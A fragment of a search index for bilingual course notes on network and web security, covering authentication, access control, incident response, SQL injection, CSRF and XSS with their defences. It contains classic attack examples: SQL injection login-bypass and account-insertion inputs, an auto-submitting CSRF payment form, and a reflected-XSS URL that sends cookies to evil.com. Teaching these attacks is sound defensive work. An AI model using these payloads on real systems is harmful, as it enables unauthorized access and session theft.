\u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 3 \u5206\u949f</p>"}, {"location": "Course/netsec/webprotect/#firewall-ids-ips-honeypot", "title": "Firewall / IDS / IPS / HoneyPot", "text": "<p>Traffic Analysis</p>"}, {"location": "Course/netsec/webprotect/#honeywords", "title": "Honeywords", "text": "<ul> <li>Associate false passwords (honeywords) with each user\u2019s account </li> <li>Attacker that steals (hashed) password file cannot distinguish from passwords from honeywords</li> <li>Attempted login using a honeyword sets off an alarm</li> </ul>"}, {"location": "Course/netsec/webprotect/#load-balancing", "title": "Load Balancing", "text": "<ul> <li>Distribute network traffic across multiple servers</li> <li>Mitigate single point of failure</li> </ul> Least Connection MethodLeast Response Time MethodRound Robin MethodIP Hash <p>direct traffic to the server with the fewest active connections</p> <p></p> <p>direct traffic to the server with the fewest active connections and the lowest average response time</p> <p></p> <p>direct traffic to one server after another following a fixed sequence</p> <p></p> <p>direct traffic to the server indexed by the hash of the IP address</p> <p></p>"}, {"location": "Course/netsec/webprotect/#traffic-scrubbing", "title": "Traffic Scrubbing", "text": "<ul> <li>Use a data cleansing service that analyzes traffic and filters malicious traffic</li> <li>Such service provider should be equipped with sufficient resources to sustain high volumetric floods</li> </ul> <p>Once an attack is detected, </p> <ul> <li>redirect traffic to scrubbing service</li> <li>Analyze and filter malicious traffic</li> <li>Deliver clean traffic to network/user</li> </ul>"}, {"location": "Course/netsec/webprotect/#user-authentication", "title": "User Authentication", "text": "<ul> <li>The basis for most types of access control and for user accountability</li> <li>The process of verifying an identity claimed by or for a system entity</li> </ul> Identification StepVerification Step <p>present an identifier to the security system</p> <p>present or generate authenticaton information that corroborates the binding between the entity and identifier</p>"}, {"location": "Course/netsec/webprotect/#means-of-authentication", "title": "Means of authentication", "text": "<p>\u4e00\u4e9b\u8ba4\u8bc1\u624b\u6bb5</p> <ul> <li>Information the user knows<ul> <li>passwords, personal identification number (PIN), answers to prearranged questions</li> </ul> </li> <li>Information the user possesses<ul> <li>electronic keycards, smart cards, physical keys</li> </ul> </li> <li>Information the user is<ul> <li>static biometrics: fingerprint, retina, face</li> </ul> </li> <li>Information the user does<ul> <li>dynamic biometrics: voice pattern, handwriting characteristics, typing rhythm</li> </ul> </li> </ul>"}, {"location": "Course/netsec/webprotect/#password", "title": "Password", "text": "Register a new passwordVerify a password <ul> <li>A cryptographic salt is made up of random bits added to each password instance before its hashing. </li> <li>Salts create unique passwords (hash code) even in the instance of two users choosing the same passwords. </li> <li>Salts\u00a0help us mitigate hash table attacks by forcing attackers to re-compute them using the salts for each user.</li> </ul> Salt Purpose <ul> <li>Prevent duplicate passwords from being visible in the password file</li> <li>Greatly increase the difficulty of offline dictionary attacks</li> <li>Greatly increase the difficulty of finding out whether a person has used the same password on two or more systems</li> </ul> Bloom Filter <ul> <li>\u5b83\u5b9e\u9645\u4e0a\u662f\u4e00\u4e2a\u5f88\u957f\u7684\u4e8c\u8fdb\u5236\u5411\u91cf\u548c\u4e00\u7cfb\u5217\u968f\u673a\u6620\u5c04\u51fd\u6570\u3002</li> <li>\u5e03\u9686\u8fc7\u6ee4\u5668\u53ef\u4ee5\u7528\u4e8e\u68c0\u7d22\u4e00\u4e2a\u5143\u7d20\u662f\u5426\u5728\u4e00\u4e2a\u96c6\u5408\u4e2d\u3002</li> <li>\u4f18\u70b9:<ul> <li>\u65f6\u95f4\u590d\u6742\u5ea6\u4f4e\uff0c\u589e\u52a0\u548c\u67e5\u8be2\u5143\u7d20\u7684\u65f6\u95f4\u590d\u6742\u4e3aO(N)\uff0c\uff08N\u4e3a\u54c8\u5e0c\u51fd\u6570\u7684\u4e2a\u6570\uff0c\u901a\u5e38\u60c5\u51b5\u6bd4\u8f83\u5c0f\uff09</li> <li>\u4fdd\u5bc6\u6027\u5f3a\uff0c\u5e03\u9686\u8fc7\u6ee4\u5668\u4e0d\u5b58\u50a8\u5143\u7d20\u672c\u8eab</li> <li>\u5b58\u50a8\u7a7a\u95f4\u5c0f\uff0c\u5982\u679c\u5141\u8bb8\u5b58\u5728\u4e00\u5b9a\u7684\u8bef\u5224\uff0c\u5e03\u9686\u8fc7\u6ee4\u5668\u662f\u975e\u5e38\u8282\u7701\u7a7a\u95f4\u7684\uff08\u76f8\u6bd4\u5176\u4ed6\u6570\u636e\u7ed3\u6784\u5982Set\u96c6\u5408\uff09</li> </ul> </li> <li>\u7f3a\u70b9:<ul> <li>\u6709\u70b9\u4e00\u5b9a\u7684\u8bef\u5224\u7387\uff0c\u4f46\u662f\u53ef\u4ee5\u901a\u8fc7\u8c03\u6574\u53c2\u6570\u6765\u964d\u4f4e</li> <li>\u65e0\u6cd5\u83b7\u53d6\u5143\u7d20\u672c\u8eab</li> <li>\u5f88\u96be\u5220\u9664\u5143\u7d20</li> </ul> </li> </ul> Quote <p>\u5e03\u9686(Bloom Filter)\u8fc7\u6ee4\u5668</p> <p>\u200b</p> Token <p>Objects that a user possesses for the purpose of user authentication</p> <p></p> Biometric <p>Authenticate a user based on the user\u2019s unique physical characteristics: facial characteristics; fingerprints; hand geometry; retinal pattern; iris; signature; voice</p> Attack and Defense <p></p>"}, {"location": "Course/netsec/webprotect/#access-control", "title": "Access Control", "text": "<p>Implement a security policy that specifies who or what (e.g., a process) may have access to each specific system resource and the type of access that is permitted in each instance</p> <p>\u4e0d\u540c\u4e3b\u4f53\u6709\u4e0d\u540c\u7684\u8bbf\u95ee\u6743\u9650</p> <p>Authorize a subject with some access right(s) for some object(s)</p> <ul> <li>Subject (Entity capable of accessing objects)<ul> <li>Owner<ul> <li>creator of a resource, system administrator, project leader, etc.</li> </ul> </li> <li>Group<ul> <li>a named group of users with shared access rights; </li> <li>a user may belong to multiple groups.</li> </ul> </li> <li>World<ul> <li>users other than owner and group</li> </ul> </li> </ul> </li> <li>Object<ul> <li>Resource to which access is controlled</li> <li>Entity used to contain and/or receive information</li> </ul> </li> <li>Access Right<ul> <li>Describe the way in which a subject may access an object</li> <li>Read, write, execute, delete, create, search\u2026</li> </ul> </li> </ul>"}, {"location": "Course/netsec/webprotect/#dac-discretionary-access-control", "title": "DAC | Discretionary Access Control", "text": "<p>\u7b80\u5355\u6765\u8bf4\u53ef\u4ee5\u5efa\u7acb\u4e00\u4e2a\u8bbf\u95ee\u63a7\u5236\u77e9\u9635 (Access Matrix)</p> <p></p> <p>\u5b9e\u73b0\u5feb\u901f\u8bbf\u95ee\uff0c\u4f46\u5982\u679c\u8fc7\u4e8e\u7a00\u758f\u7684\u8bdd\uff0c\u4f1a\u6d6a\u8d39\u7a7a\u95f4</p> <p>\u5f15\u5165\u4e0b\u9762\u4e24\u79cd\u8bbe\u8ba1\uff1a</p> Access Control List (ACL)Capability List <p></p> <p></p>"}, {"location": "Course/netsec/webprotect/#rbac-role-based-access-control", "title": "RBAC | Role-Based Access Control", "text": "<ul> <li>Assign users with different roles according to their responsibilities</li> <li>Check the roles that users assume in a system rather than the user\u2019s identity</li> </ul>"}, {"location": "Course/netsec/webprotect/#abac-attribute-based-access-control", "title": "ABAC | Attribute-Based Access Control", "text": "<p>Define authorizations that express conditions on properties of both the resource and the subject</p> <p>\u57fa\u4e8e\u5b9e\u65f6\u7684\u5c5e\u6027\u548c\u4f7f\u7528\u573a\u666f\u5212\u5206\u7528\u6237\u5bf9\u67d0\u8d44\u6e90\u7684\u8bbf\u95ee\u6743\u9650, \u66f4\u7075\u6d3b\uff0c\u524d\u51e0\u79cd\u90fd\u662f\u5206\u914d\u4e86\u8bbf\u95ee\u6743\u9650\u4e4b\u540e\u5c31\u56fa\u5b9a\u4e86</p> RBAC to ABAC <ul> <li>roles can define privileges that can be dynamically determined based on any attribute of user/subject or data/object</li> </ul>"}, {"location": "Course/netsec/webprotect/#incident-response", "title": "Incident Response", "text": "<p>Cyclical activity featuring ongoing learning and advancements to discover how to best protect the organization | \u5468\u671f\u6027\u6d3b\u52a8\uff0c\u4e0d\u65ad\u5b66\u4e60\u548c\u8fdb\u6b65\uff0c\u4ee5\u53d1\u73b0\u5982\u4f55\u6700\u597d\u5730\u4fdd\u62a4\u7ec4\u7ec7</p> <p>Four main stages: (\u5728\u56db\u4e2a\u9636\u6bb5\u4e2d\u4e0d\u65ad\u5207\u6362\u53cd\u590d)</p> <ul> <li>preparation<ul> <li>Set up baseline of normal activity. Determine which types of security events should be investigated</li> </ul> </li> <li>detection/analysis<ul> <li>Detect potential attack and further investigate if and how it deviates from normal behavior</li> </ul> </li> <li>containment/eradication<ul> <li>Identify and block attacking traffic; identify and remove attack related elements</li> </ul> </li> <li>recovery<ul> <li>Recover normal operations as quickly as possible, taking steps to prevent subsequent attacks</li> </ul> </li> </ul> <p></p> Incident Response Steps <ul> <li>Assemble a team of experts</li> <li>Detect and ascertain the source</li> <li>Contrain and recover</li> <li>Assess damage and severity</li> <li>Begin the notification process</li> <li>Take actions for prevention</li> <li>\u2026</li> </ul>"}, {"location": "Course/netsec/websec/", "title": "Web Security", "text": "<p> \u7ea6 2446 \u4e2a\u5b57  17 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 8 \u5206\u949f</p>"}, {"location": "Course/netsec/websec/#some-concepts", "title": "Some Concepts", "text": "<ol> <li>Web Service<ul> <li>A platform for deploying applications and sharing information, portably and securely, using HTTP/HTTPS</li> </ul> </li> <li>URL (Uniform Resource Locator)<ul> <li>Global identifiers of network-retrievable resources</li> </ul> </li> <li>HTTP (HyperText Transfer Protocol)<ul> <li>A common data communication protocol on the web</li> <li> <p>HTTP Request</p> <ul> <li>GET: request data from a specified resource</li> <li>POST: send data to a server to create/update a resource</li> </ul> <p>HTTP</p> <p></p> <ul> <li>In HTTP, \u201cReferer\u201d is an optional HTTP header field that identifies the address of the web page, from which the resource has been requested. By checking the referrer, the server providing the new web page can see where the request originated.</li> <li>In the most common situation, this means that when a user clicks a hyperlink in a web browser, causing the browser to send a request to the server holding the destination web page, the request may include the Referer field, which indicates the last page the user was on (the one where they clicked the link).</li> </ul> <ul> <li>HTTP Response</li> </ul> </li> </ul> </li> </ol> <ul> <li>Webpage Languages:<ul> <li>HTML: HyperText Markup Language<ul> <li>A language to create structured docs</li> <li>One can embed images, objects, or create interactive forms</li> </ul> </li> <li>CSS: Cascading Style Sheets<ul> <li>Style sheet language used for describing the presentation of a doc</li> </ul> </li> <li>JavaScript: A programming language that enables interactive web pages<ul> <li>Programming language used to manipulate  web pages. </li> <li>It is a high-level, untyped and  interpreted language with support for objects.</li> <li>Supported by all web browsers</li> </ul> </li> </ul> </li> <li>Page Rendering </li> </ul> DOM <p>DOM (Document Object Model) is a programming interface for HTML and XML documents. \u5b83\u5c06\u6587\u6863\u8868\u793a\u4e3a\u4e00\u4e2a\u7531\u8282\u70b9\u548c\u5c5e\u6027\u7ec4\u6210\u7684\u5bf9\u8c61\u6811\uff0c\u53ef\u4ee5\u901a\u8fc7 JavaScript \u7b49\u811a\u672c\u8bed\u8a00\u6765\u8bbf\u95ee\u548c\u4fee\u6539\u3002DOM \u63d0\u4f9b\u4e86\u4e00\u4e9b\u65b9\u6cd5\u548c\u5c5e\u6027\u6765\u5bf9\u6587\u6863\u4e2d\u7684\u5143\u7d20\u8fdb\u884c\u9009\u62e9\u3001\u6dfb\u52a0\u3001\u5220\u9664\u6216\u4fee\u6539</p> <ul> <li>Frame (<code>&lt;iframe src=\"URL\"&gt;&lt;/iframe&gt;</code>): Enable embedding a webpage within a webpage<ul> <li>Outer page can specify only sizing and placement of the frame in the outer page</li> <li>Frame isolation: Outer page cannot change contents of inner page, inner page cannot change contents of outer page</li> <li>Modularity: <ul> <li>bring together content from multiple sources;</li> <li>aggregate on client side</li> <li>Delegation: frame can draw its own rectangle;</li> </ul> </li> </ul> </li> </ul>"}, {"location": "Course/netsec/websec/#web-security-goals", "title": "Web Security Goals", "text": "<ul> <li>Integrity | \u5b8c\u6574\u6027<ul> <li>malicious web sites should not be able to tamper with integrity of my computer or my information on other web sites | \u6076\u610f\u7f51\u7ad9\u4e0d\u5e94\u80fd\u591f\u4fee\u6539\u8ba1\u7b97\u673a\uff0c\u6216\u8005\u5176\u4ed6\u7f51\u7ad9\u4e0a\u7684\u4fe1\u606f</li> </ul> </li> <li>Confidentiality | \u673a\u5bc6\u6027<ul> <li>malicious web sites should not be able to learn confidential information from my computer or other web sites | \u6076\u610f\u7f51\u7ad9\u4e0d\u5e94\u80fd\u591f\u4ece\u6211\u7684\u8ba1\u7b97\u673a\u6216\u5176\u4ed6\u7f51\u7ad9\u4e0a\u83b7\u53d6\u673a\u5bc6\u4fe1\u606f</li> </ul> </li> <li>Privacy | \u9690\u79c1<ul> <li>malicious web sites should not be able to spy on me or my activities online | \u6076\u610f\u7f51\u7ad9\u4e0d\u5e94\u80fd\u591f\u7aa5\u63a2\u6211\u7684\u5728\u7ebf\u6d3b\u52a8</li> </ul> </li> <li>Availability | \u53ef\u7528\u6027<ul> <li>attacker cannot make web sites unavailable</li> </ul> </li> </ul>"}, {"location": "Course/netsec/websec/#web-security-server-side", "title": "Web Security: Server Side", "text": "<ul> <li>\u53ef\u80fd\u9047\u5230\u7684\u95ee\u9898\uff1a<ul> <li>Steal sensitive data | \u7a83\u53d6\u654f\u611f\u4fe1\u606f</li> <li>Change server data | \u4fee\u6539\u670d\u52a1\u5668\u6570\u636e</li> <li>Gateway to enabling attacks on clients | \u4e3a\u5bf9\u5ba2\u6237\u7aef\u7684\u653b\u51fb\u6253\u5f00\u5927\u95e8</li> <li>Impersonation (of users to servers, or vice versa) | \u5192\u5145\u7528\u6237\u6216\u670d\u52a1\u5668</li> <li>Injection Attack | \u6ce8\u5165\u653b\u51fb<ul> <li>Attacker user provides malicious inputs</li> <li>Web server does not check input format</li> <li>Enables attacker to execute arbitrary code on the server</li> </ul> </li> </ul> </li> </ul> <p>Structure of Web Service</p> <p></p> Database <ul> <li>Structured collection of data often storing tuples/rows of related values; organized in tables;</li> <li>Widely used by web services to store server and user information</li> <li>Database runs as separate process to which web server connects:<ul> <li>web server sends queries or commands derived from incoming HTTP requests; </li> <li>database server returns associated values or modifies/updates values;</li> </ul> </li> </ul> SQL <ul> <li>Widely used database query language</li> <li>Fetch a set of rows<ul> <li><code>SELECT column FROM table WHERE condition</code></li> <li>returns the value(s) of the given column in the specified table, for all records where condition is true.</li> </ul> </li> </ul> <p>Example: \u5bf9\u4e8e\u8868</p> <p></p> QueryAdd/modify dataDelete entire tableIssue multiple commands, separated by semicolon: Comment <ul> <li><code>SELECT Balance FROM Customer WHERE Username = 'Jane'</code></li> <li>Returns <code>79.2</code></li> </ul> <ul> <li><code>INSERT INTO Customer VALUES (8477, 'oski', 10.00)</code></li> <li>table will be updated with new row <code>8477 | oski | 10.00</code></li> </ul> <p><code>DROP TABLE Customer</code></p> <ul> <li><code>INSERT INTO Customer VALUES (4433, 'vladimir',  70.0); SELECT AcctNum FROM Customer WHERE Username='vladimir'</code></li> <li>Adds a new row to the table and returns the value of <code>4433</code></li> </ul> <ol> <li><code>#</code> Comment to end of line</li> <li><code>--</code> Comment to end of line</li> <li><code>/* ... */</code> Comment block</li> </ol>"}, {"location": "Course/netsec/websec/#sql-injection", "title": "SQL Injection", "text": "<ul> <li>Exploit malicious login inputs</li> </ul> Example 1Example 2 <p>\u4ee4 user = \u201c<code>' or 1=1 --</code>\u201c\uff0c \u811a\u672c\u4f1a\u88ab\u89e3\u91ca\u4e3a\uff1a</p> <ul> <li><code>ok = execute( SELECT * FROM Users WHERE user= ' ' or 1=1 -- ... )</code></li> <li>\u201c\u2013\u201d \u4f1a\u6ce8\u91ca\u6389\u540e\u9762\u7684\u6240\u6709\u5185\u5bb9\uff0c\u6545 <code>ok</code> \u4f1a\u6052\u7b49\u4e8e <code>True</code>\uff0c\u767b\u5f55\u6210\u529f</li> </ul> <p>\u4ee4 user = \u201c<code>'; INSERT INTO TABLE Users ('attacker', 'attacker secret'); --</code>\u201d, \u811a\u672c\u4f1a\u88ab\u89e3\u91ca\u4e3a\uff1a</p> <ul> <li><code>ok = execute(SELECT * FROM Users WHERE user= ' '; INSERT INTO TABLE Users ('attacker', 'attacker secret'); --...)</code></li> <li>\u4f1a\u521b\u5efa\u4e00\u4e2a\u6211\u4eec\u6307\u5b9a\u7684\u8d26\u6237</li> </ul> <p>\u4e0b\u9762\u662f\u4e00\u4e9b Solution:</p>"}, {"location": "Course/netsec/websec/#solution-input-sanitization", "title": "Solution: Input Sanitization", "text": "<p>Sanitize user input (\u6e05\u9664\u7528\u6237\u8f93\u5165): check or enforce that value/string does not have commands of any sort (\u68c0\u67e5\u6216\u8005\u901a\u8fc7\u64cd\u4f5c\u4f7f\u5f97\u7528\u6237\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u4e0d\u5b58\u5728\u4efb\u4f55\u6307\u4ee4)</p> <ul> <li>Disallow special characters | \u62d2\u7edd\u7279\u6b8a\u7684\u5b57\u7b26; or</li> <li>Escape input string | \u8f6c\u4e49\u8f93\u5165\u5b57\u7b26\u4e32</li> </ul> Input Escaping <ul> <li>the input string should be interpreted as a string and not as a special char;</li> <li>to escape the SQL parser, use backslash <code>\\</code> in front of special characters, such as quotes or backslashes</li> <li>Different SQL parsers have different escape sequences or API for escaping</li> <li>For <code>'</code>, parser considers a string is starting or ending</li> <li>For <code>\\'</code>, parser considers it as a character part of a string and converts it to <code>'</code></li> </ul> Escaping examples: <pre><code>[...] WHERE Username='alice';\nalice\n[...] WHERE Username='alice\\';\nalice', syntax error, quote not closed\n[...] WHERE Username='alice\\\";\nalice'\n[...] WHERE Username='alice\\\\';\nalice\\\n</code></pre>"}, {"location": "Course/netsec/websec/#solution-prepared-statement", "title": "Solution: Prepared Statement", "text": "<ul> <li>Fundamental cause of SQL injection: mixing data and code</li> <li>Fundamental solution: separate data and code</li> </ul> <ul> <li>It is an optimized feature that provides improved performance if the same or similar SQL statement needs to be executed repeatedly.</li> <li>Using prepared statements, we send an SQL statement template to the database, with certain values called parameters left unspecified. </li> <li>The database parses, compiles and performs query optimization on the SQL statement template and stores the result without executing it. </li> <li>We later bind data to the prepared statement.</li> </ul> <p>\u53d1\u9001\u8bed\u53e5\u6a21\u7248\uff0c\u7b49\u540e\u7eed\u7528\u6237\u8fdb\u884c\u53c2\u6570\u7ed1\u5b9a\u518d\u8ba1\u7b97\uff0c\u4ece\u800c\u4f18\u5316\u4e86\u4e00\u4e9b\u5e38\u7528\u6216\u7c7b\u4f3c SQL \u8bed\u53e5\u7684\u6267\u884c</p> <ul> <li>Trusted code is sent via a code channel</li> <li>Untrusted user-provided data are sent via data channel</li> </ul> <ul> <li>Database clearly knows the boundary between code and data</li> <li>Data received from the data channel is not parsed</li> <li>Attacker can hide code in data, but the code will never be treated as code, so it will never be attacked</li> </ul> <p>\u6570\u636e\u5e93\u975e\u5e38\u660e\u786e\u5730\u4e86\u89e3\u4ee3\u7801\u548c\u6570\u636e\u4e4b\u95f4\u7684\u754c\u9650\uff0c\u901a\u8fc7\u540e\u9762\u7684\u7ed1\u5b9a\u4f20\u5165\u7684\u53c2\u6570\u5e76\u4e0d\u4f1a\u88ab\u89e3\u6790</p> <p></p>"}, {"location": "Course/netsec/websec/#web-security-client-side", "title": "Web Security: Client Side", "text": ""}, {"location": "Course/netsec/websec/#same-origin-policy", "title": "Same-Origin Policy", "text": "<ul> <li>Prevent a malicious site from spying on or tampering with user information or interactions with other websites | \u9632\u6b62\u6076\u610f\u7f51\u7ad9\u76d1\u89c6/\u7be1\u6539\u7528\u6237\u4fe1\u606f\u6216\u4e0e\u5176\u4ed6\u7f51\u7ad9\u7684\u4ea4\u4e92</li> <li> <p>Enforeced by browsers | \u6d4f\u89c8\u5668\u5f3a\u5236\u6267\u884c</p> </li> <li> <p>Policy 1: Each site in the browser is isolated from all others | \u6d4f\u89c8\u5668\u4e2d\u4e0d\u540c\u7ad9\u70b9\u76f8\u4e92\u9694\u79bb</p> </li> <li>Policy 2: Multiple pages from the same site are not isolated | \u540c\u4e00\u7ad9\u70b9\u7684\u4e0d\u540c\u9875\u9762\u4e0d\u9694\u79bb</li> </ul> <p>Origin = Protocol + Hostname + Port</p> Example <p>\u5bf9\u4e8e <code>http://coolsite.com:81/tools/info.html</code></p> <ul> <li>Protocol: <code>http</code></li> <li>Hostname: <code>coolsite.com</code></li> <li>Port: <code>81</code></li> </ul> <ul> <li>String matching: same origins should match</li> <li>One origin should not be able to access the resources of another origin</li> </ul> <p>Examples:</p> Originating Document Accessed Document Yes/No <code>http://wikipedia.org/a/</code> <code>http://wikipedia.org/b/</code> Yes <code>http://wikipedia.org/</code> <code>http://www.wikipedia.org/</code> No <code>http://wikipedia.org/</code> <code>https://wikipedia.org/</code> No <code>http://wikipedia.org:81/</code> <code>http://wikipedia.org:82/</code> No <code>http://wikipedia.org:81/</code> <code>http://wikipedia.org/</code> No"}, {"location": "Course/netsec/websec/#cross-site-attack", "title": "Cross-Site Attack", "text": "<p>\u5305\u62ec\uff1a</p> <ul> <li>CSRF (Cross-Site Request Forgery)</li> <li>XSS (Cross-Site Scripting)</li> </ul> <p>\u4e00\u4e9b\u524d\u7f6e\u77e5\u8bc6\uff1a</p>"}, {"location": "Course/netsec/websec/#prerequisite-cookies", "title": "Prerequisite: Cookies", "text": "<ul> <li>For the first time when a browser connects to a web server, the server includes in the response a Set-Cookie: header</li> <li>Each cookie is just a name-value pair</li> </ul> <p>\u5982\u679c\u73b0\u5728\u6709\u80fd\u5bf9\u5e94\u7684 cookie \u5c31\u5e26\u4e0a\uff1b\u5982\u679c\u6ca1\u6709\u7684\u8bdd\u670d\u52a1\u5668\u4f1a\u8fd4\u56de\u4e00\u4e2a Set-Cookie: </p> <p></p>"}, {"location": "Course/netsec/websec/#prerequisite-session-token", "title": "Prerequisite: Session Token", "text": "<p>An HTTP session is a sequence of network request-response transactions.\u00a0</p> <p></p> <p>A session token is a unique identifier that is generated and sent from a\u00a0server\u00a0to a\u00a0client\u00a0to identify the current interaction session.</p> <ul> <li>Server assigns a session token to each user after they logged in, places it in the cookie</li> <li>The server keeps a table of username to current session token, so when it sees the session token it knows which user</li> </ul>"}, {"location": "Course/netsec/websec/#csrf", "title": "CSRF", "text": "<p>Abstract</p> <ul> <li>\u5229\u7528 Web \u670d\u52a1\u5668\u5728\u8fde\u63a5\u4f1a\u8bdd\u4e2d\u7528\u4e8e\u8bc6\u522b\u7528\u6237\u7684 Cookie\u200b</li> <li>\u7b2c\u4e09\u65b9\u7f51\u7ad9\u53ef\u4ee5\u4f2a\u9020\u4e0e\u540c\u4e00\u7ad9\u70b9\u8bf7\u6c42\u5b8c\u5168\u76f8\u540c\u7684\u8bf7\u6c42\u200b</li> <li>\u670d\u52a1\u5668\u65e0\u6cd5\u533a\u5206\u540c\u4e00\u7ad9\u70b9\u548c\u8de8\u7ad9\u70b9\u8bf7\u6c42</li> </ul> Example <p></p> <ul> <li>\u653b\u51fb\u8005\u5229\u7528\u7528\u6237\u5df2\u767b\u5f55\u7684\u8eab\u4efd\uff0c\u5728\u7528\u6237\u4e0d\u77e5\u60c5\u7684\u60c5\u51b5\u4e0b\u53d1\u9001\u6076\u610f\u8bf7\u6c42\u7ed9\u76ee\u6807\u7f51\u7ad9\uff0c\u4ece\u800c\u6b3a\u9a97\u7f51\u7ad9\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4f8b\u5982\u4fee\u6539\u7528\u6237\u7684\u8d26\u6237\u4fe1\u606f\u3001\u53d1\u9001\u5783\u573e\u90ae\u4ef6\u6216\u6267\u884c\u6076\u610f\u4ee3\u7801\u7b49\u3002\u200b</li> <li>\u653b\u51fb\u8005\u901a\u5e38\u4f1a\u901a\u8fc7\u6b3a\u9a97\u7528\u6237\u70b9\u51fb\u6076\u610f\u94fe\u63a5\u6216\u8bbf\u95ee\u6076\u610f\u7f51\u7ad9\uff0c\u4ece\u800c\u5728\u7528\u6237\u7684\u6d4f\u89c8\u5668\u4e2d\u690d\u5165\u6076\u610f\u4ee3\u7801\u6216\u94fe\u63a5\u3002\u5f53\u7528\u6237\u8bbf\u95ee\u53d7\u5bb3\u7f51\u7ad9\u65f6\uff0c\u6076\u610f\u4ee3\u7801\u6216\u94fe\u63a5\u4f1a\u81ea\u52a8\u5411\u76ee\u6807\u7f51\u7ad9\u53d1\u9001\u8bf7\u6c42\uff0c\u89e6\u53d1 CSRF \u653b\u51fb\u3002</li> </ul> <p>\u7528\u6237\u8bbf\u95ee <code>bank.com</code>, \u5b83\u7684 session cookie \u4f1a\u88ab\u4fdd\u5b58\u5728\u6d4f\u89c8\u5668\u4e2d\uff0c\u5f53\u7528\u6237\u8bbf\u95ee\u5305\u542b\u4ee5\u4e0b\u5185\u5bb9\u7684\u6076\u610f\u7f51\u7ad9\u65f6\uff1a</p> <pre><code>&lt;form name=F action=http://bank.com/BillPay.php&gt;\n&lt;input name=receipient value=attacker&gt;...\n&lt;script&gt; document.F.submit() &lt;/script&gt;\n</code></pre> <p>\u6d4f\u89c8\u5668\u4f1a\u53d1\u9001\u5e26\u6709\u7528\u6237\u7684 auth cookie \u7684 request \u8bf7\u6c42\uff0c\u4ece\u800c\u5b8c\u6210\u4e86\u4f2a\u9020\u7684\u4ea4\u6613</p>"}, {"location": "Course/netsec/websec/#csrf-defenses", "title": "CSRF Defenses", "text": "<p>1) Referer Validation</p> <p>The <code>Referer</code> field in the HTTP header indicates which URL initiated the request</p> <p></p> <p>\u5982\u6b64\u5047\u8bbe\u5bf9\u4e8e <code>bank.com</code> \u7684\u4ea4\u6613\u8bf7\u6c42\uff0c<code>Referer</code> \u4e0d\u662f <code>bank.com</code> \u7684\u8bdd\u5c31\u62d2\u7edd</p> <p>2) CSRF Token</p> <p>To defeat CSRF Attack, \u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u4e00\u79cd\u65b9\u6cd5\u6765\u786e\u5b9a HTTP \u8bf7\u6c42\u662f\u5426\u662f\u901a\u8fc7\u5e94\u7528\u7a0b\u5e8f\u7684\u7528\u6237\u754c\u9762\u5408\u6cd5\u751f\u6210\u7684, \u6700\u4f73\u65b9\u6cd5\u662f\u4f7f\u7528 CSRF Token</p> <p>CSRF Token \u662f\uff1a</p> <ul> <li>a unique, secret, unpredictable value generated by the server-side app and transmitted to the client;</li> <li>included in a subsequent HTTP request made by the client;</li> <li>the server-side application validates that the request includes the expected token and rejects the request if the token is missing or invalid.</li> </ul> <ul> <li>The CSRF tokens must be a part of the HTML form, not stored in session cookies.</li> <li>The easiest way to add a non-predictable parameter is to use a secure hash function (e.g., SHA-2) to hash the user\u2019s session ID. </li> <li>To ensure randomness, the tokens must be generated by a cryptographically secure random number generator.</li> </ul>"}, {"location": "Course/netsec/websec/#xss-attack", "title": "XSS Attack", "text": "<ul> <li>Attacker injects a malicious script into the webpage viewed by a victim user;</li> <li>Script runs in user\u2019s browser with access to page\u2018s data.</li> </ul> <p>Cross-Site Scripting\u00a0(XSS)\u00a0attacks\u00a0are a type of injection, in which malicious scripts are injected into otherwise benign<sup>1</sup> and trusted websites.</p> <p>\u6838\u5fc3\u4ecd\u7136\u662f\u4e4b\u524d\u7684 Same-Origin Policy</p> <p>1) Stored XSS</p> <p>attacker leaves JavasScript lying around on benign web service for victim to load (\u811a\u672c\u4f1a\u6301\u4e45\u5730\u5b58\u50a8\u5728\u670d\u52a1\u5668\u7684\u6570\u636e\u5e93\u4e2d)</p> <ul> <li>The attacker manages to store a malicious script at the web server, e.g., at <code>bank.com</code></li> <li>The server later unwittingly sends script to a victim\u2019s browser</li> <li>Browser runs script in the same origin as the <code>bank.com</code> server</li> </ul> Example <p></p> <p>2) Reflected XSS</p> <p>attacker gets user to click on specially-crafted URL with script in it, web service reflects script back</p> <p>\u653b\u51fb\u8005\u628a\u811a\u672c\u901a\u8fc7 URL \u7684\u65b9\u5f0f\u53d1\u7ed9\u670d\u52a1\u5668\uff08\u53ef\u4ee5\u53d1\u7ed9 victim \u8ba9\u4ed6\u8bbf\u95ee\u8fd9\u4e2a URL\uff09\uff0c\u800c\u670d\u52a1\u5668\u5982\u679c\u8bd5\u56fe\u4e0d\u52a0\u5904\u7406\u5730\u663e\u793a\u8f93\u5165\uff08\u4f8b\u5982\u641c\u7d22\u7ed3\u679c\u7b49\uff09\uff0c\u5c31\u4f1a\u4f7f\u5f97\u8bbf\u95ee\u8005\u8fd0\u884c\u76f8\u5e94\u7684\u811a\u672c</p> Example \u5927\u4f53\u6d41\u7a0b\u5177\u4f53\u4f8b\u5b50 <p></p> <ul> <li>Example malicious URL: </li> </ul> <pre><code>http://bank.com/search.php?term=\n    &lt;script&gt;window.open(\n        'http://evil.com/?cookie= \" + \n        document.cookie) &lt;/script&gt;\n</code></pre> <ul> <li>If user clicks this link: browser goes to <code>bank.com/search.php?...</code>, and <code>bank.com</code> returns:</li> </ul> <pre><code>&lt;HTML&gt; Results for &lt;script&gt;...&lt;/Script&gt;\n</code></pre> <ul> <li>browser executes script in same origin as <code>bank.com</code></li> <li>browser sends to <code>evil.com</code> the cookie for <code>bank.com</code></li> </ul>"}, {"location": "Course/netsec/websec/#xss-defenses", "title": "XSS Defenses", "text": "<p>1) Input Validation</p> <p>check that inputs are of expected form</p> <p>whitelisting instead of blacklisting;</p> <p>2) Output Escaping</p> <p>escape dynamic data before inserting it into HTML</p> Example \u7406\u8bba\u5177\u4f53\u4f8b\u5b50 <ul> <li>HTML parser looks for special characters: <code>&lt; &gt; &amp; \" '</code></li> <li>Ideally, user-provided input string should not contain special chars</li> <li>Escape parser:</li> </ul> Character Escape Sequence <code>&lt;</code> <code>&amp;lt;</code> <code>&gt;</code> <code>&amp;gt;</code> <code>&amp;</code> <code>&amp;amp;</code> <code>\"</code> <code>&amp;quot;</code> <code>'</code> 